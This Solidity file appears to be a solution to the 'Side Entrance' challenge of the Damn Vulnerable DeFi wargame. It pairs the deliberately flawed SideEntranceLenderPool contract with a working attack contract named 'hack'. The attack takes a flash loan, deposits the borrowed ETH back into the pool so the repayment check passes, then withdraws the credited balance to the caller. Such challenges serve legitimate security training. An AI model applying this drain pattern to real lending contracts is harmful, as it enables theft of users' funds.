// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";
import "hardhat/console.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

interface IPool {
    function deposit() external payable;

    function flashLoan(uint256 amount) external payable;

    function withdraw() external;
}

contract hack {
    using Address for address payable;

    address pool;

    constructor(address _pool) {
        pool = _pool;
    }

    function execute() external payable {
        IPool(pool).deposit{value: msg.value}();
    }

    function hacker(uint256 amount) public payable {
        IPool(pool).flashLoan(amount);
    }

    function withdraw() public payable {
        IPool(pool).withdraw();
        payable(msg.sender).sendValue(address(this).balance);
    }

    receive() external payable {}
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(
            address(this).balance >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}
